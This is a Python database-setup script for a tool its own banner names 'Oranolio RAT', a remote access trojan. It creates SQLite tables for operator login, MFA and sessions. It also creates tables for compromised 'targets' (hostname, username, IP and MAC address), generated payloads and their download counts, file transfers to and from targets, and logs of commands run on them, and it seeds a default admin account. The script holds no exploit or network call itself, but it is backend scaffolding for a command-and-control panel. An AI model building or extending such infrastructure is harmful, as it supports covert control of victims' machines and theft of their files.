#!/usr/bin/env python3
"""
Complete Database Initialization Script
Initializes all databases with proper schema and indexes for optimal performance
"""

import os
import sys
import sqlite3
from pathlib import Path
from datetime import datetime

# Ensure data directory exists
DATA_DIR = Path("data")
DATA_DIR.mkdir(exist_ok=True)

def init_email_auth_db():
    """Initialize email authentication database"""
    db_path = DATA_DIR / "email_auth.db"
    print(f"[*] Initializing email auth database: {db_path}")
    
    conn = sqlite3.connect(str(db_path))
    cursor = conn.cursor()
    
    # Email authentication table
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS email_auth (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email TEXT UNIQUE NOT NULL,
            verification_code TEXT,
            code_expires_at TIMESTAMP,
            is_verified INTEGER DEFAULT 0,
            login_attempts INTEGER DEFAULT 0,
            locked_until TIMESTAMP,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            last_login TIMESTAMP,
            last_ip TEXT,
            user_agent TEXT
        )
    """)
    
    # Create indexes for performance
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_email ON email_auth(email)")
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_verified ON email_auth(is_verified)")
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_created ON email_auth(created_at)")
    
    conn.commit()
    conn.close()
    print(f"[✓] Email auth database initialized")

def init_mfa_db():
    """Initialize MFA/2FA database"""
    db_path = DATA_DIR / "mfa_auth.db"
    print(f"[*] Initializing MFA database: {db_path}")
    
    conn = sqlite3.connect(str(db_path))
    cursor = conn.cursor()
    
    # MFA secrets table
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS mfa_secrets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email TEXT UNIQUE NOT NULL,
            secret TEXT NOT NULL,
            backup_codes TEXT,
            is_enabled INTEGER DEFAULT 0,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            last_used TIMESTAMP,
            device_name TEXT,
            device_fingerprint TEXT
        )
    """)
    
    # MFA verification attempts
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS mfa_attempts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_email TEXT NOT NULL,
            code TEXT NOT NULL,
            success INTEGER DEFAULT 0,
            ip_address TEXT,
            user_agent TEXT,
            attempted_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)
    
    # Create indexes
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_mfa_email ON mfa_secrets(email)")
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_mfa_enabled ON mfa_secrets(is_enabled)")
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_attempts_email ON mfa_attempts(user_email)")
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_attempts_time ON mfa_attempts(attempted_at)")
    
    conn.commit()
    conn.close()
    print(f"[✓] MFA database initialized")

def init_sessions_db():
    """Initialize sessions database"""
    db_path = DATA_DIR / "sessions.db"
    print(f"[*] Initializing sessions database: {db_path}")
    
    conn = sqlite3.connect(str(db_path))
    cursor = conn.cursor()
    
    # Sessions table
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id TEXT UNIQUE NOT NULL,
            email TEXT NOT NULL,
            ip_address TEXT,
            user_agent TEXT,
            device_fingerprint TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            last_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            expires_at TIMESTAMP,
            is_active INTEGER DEFAULT 1,
            logout_at TIMESTAMP
        )
    """)
    
    # Session activity log
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS session_activity (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id TEXT NOT NULL,
            activity_type TEXT NOT NULL,
            details TEXT,
            ip_address TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)
    
    # Create indexes
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_session_id ON sessions(session_id)")
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_session_email ON sessions(email)")
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_session_active ON sessions(is_active)")
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_activity_session ON session_activity(session_id)")
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_activity_time ON session_activity(timestamp)")
    
    conn.commit()
    conn.close()
    print(f"[✓] Sessions database initialized")

def init_logs_db():
    """Initialize logging database"""
    db_path = DATA_DIR / "logs.db"
    print(f"[*] Initializing logs database: {db_path}")
    
    conn = sqlite3.connect(str(db_path))
    cursor = conn.cursor()
    
    # Security logs
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS security_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            event_type TEXT NOT NULL,
            severity TEXT NOT NULL,
            email TEXT,
            ip_address TEXT,
            user_agent TEXT,
            details TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)
    
    # Application logs
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS app_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            level TEXT NOT NULL,
            module TEXT,
            message TEXT NOT NULL,
            stack_trace TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)
    
    # Command execution logs
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS command_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id TEXT,
            command TEXT NOT NULL,
            target_id TEXT,
            status TEXT,
            output TEXT,
            executed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            completed_at TIMESTAMP
        )
    """)
    
    # Create indexes
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_security_type ON security_logs(event_type)")
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_security_time ON security_logs(timestamp)")
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_app_level ON app_logs(level)")
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_app_time ON app_logs(timestamp)")
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_command_session ON command_logs(session_id)")
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_command_time ON command_logs(executed_at)")
    
    conn.commit()
    conn.close()
    print(f"[✓] Logs database initialized")

def init_main_db():
    """Initialize main application database"""
    db_path = DATA_DIR / "main.db"
    print(f"[*] Initializing main database: {db_path}")
    
    conn = sqlite3.connect(str(db_path))
    cursor = conn.cursor()
    
    # Connected targets/agents
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS targets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_id TEXT UNIQUE NOT NULL,
            hostname TEXT,
            username TEXT,
            os_type TEXT,
            os_version TEXT,
            ip_address TEXT,
            mac_address TEXT,
            first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            is_active INTEGER DEFAULT 1,
            metadata TEXT
        )
    """)
    
    # Payloads generated
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS payloads (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            payload_id TEXT UNIQUE NOT NULL,
            payload_type TEXT NOT NULL,
            platform TEXT NOT NULL,
            config TEXT,
            created_by TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            download_count INTEGER DEFAULT 0,
            last_downloaded TIMESTAMP
        )
    """)
    
    # File transfers
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS file_transfers (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            transfer_id TEXT UNIQUE NOT NULL,
            target_id TEXT,
            direction TEXT NOT NULL,
            filename TEXT NOT NULL,
            filesize INTEGER,
            status TEXT DEFAULT 'pending',
            started_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            completed_at TIMESTAMP,
            error_message TEXT
        )
    """)
    
    # Create indexes
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_target_id ON targets(target_id)")
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_target_active ON targets(is_active)")
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_payload_id ON payloads(payload_id)")
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_transfer_id ON file_transfers(transfer_id)")
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_transfer_target ON file_transfers(target_id)")
    
    conn.commit()
    conn.close()
    print(f"[✓] Main database initialized")

def optimize_databases():
    """Optimize all databases for performance"""
    print("\n[*] Optimizing databases for performance...")
    
    db_files = [
        "email_auth.db",
        "mfa_auth.db",
        "sessions.db",
        "logs.db",
        "main.db"
    ]
    
    for db_file in db_files:
        db_path = DATA_DIR / db_file
        if db_path.exists():
            conn = sqlite3.connect(str(db_path))
            cursor = conn.cursor()
            
            # Enable WAL mode for better concurrency
            cursor.execute("PRAGMA journal_mode=WAL")
            
            # Optimize cache size
            cursor.execute("PRAGMA cache_size=10000")
            
            # Set page size
            cursor.execute("PRAGMA page_size=4096")
            
            # Enable foreign keys
            cursor.execute("PRAGMA foreign_keys=ON")
            
            # Analyze for query optimization
            cursor.execute("ANALYZE")
            
            # Vacuum to reclaim space
            cursor.execute("VACUUM")
            
            conn.commit()
            conn.close()
            print(f"[✓] Optimized {db_file}")

def create_admin_user():
    """Create default admin user for initial access"""
    print("\n[*] Creating default admin access...")
    
    db_path = DATA_DIR / "email_auth.db"
    conn = sqlite3.connect(str(db_path))
    cursor = conn.cursor()
    
    # Check if admin exists
    cursor.execute("SELECT email FROM email_auth WHERE email = ?", ("admin@oranolio.local",))
    if not cursor.fetchone():
        cursor.execute("""
            INSERT INTO email_auth (email, is_verified, created_at)
            VALUES (?, 1, ?)
        """, ("admin@oranolio.local", datetime.now()))
        conn.commit()
        print("[✓] Default admin user created: admin@oranolio.local")
    else:
        print("[✓] Admin user already exists")
    
    conn.close()

def main():
    """Main initialization function"""
    print("=" * 70)
    print("Oranolio RAT - Database Initialization")
    print("=" * 70)
    print()
    
    try:
        # Initialize all databases
        init_email_auth_db()
        init_mfa_db()
        init_sessions_db()
        init_logs_db()
        init_main_db()
        
        # Optimize for performance
        optimize_databases()
        
        # Create admin user
        create_admin_user()
        
        print("\n" + "=" * 70)
        print("[✓] All databases initialized successfully!")
        print("=" * 70)
        print("\nDatabase files created in:", DATA_DIR.absolute())
        print("\nYou can now start the application with:")
        print("  python main.py")
        print("\nDefault admin email: admin@oranolio.local")
        print("=" * 70)
        
        return 0
        
    except Exception as e:
        print(f"\n[✗] Error during initialization: {e}")
        import traceback
        traceback.print_exc()
        return 1

if __name__ == "__main__":
    sys.exit(main())
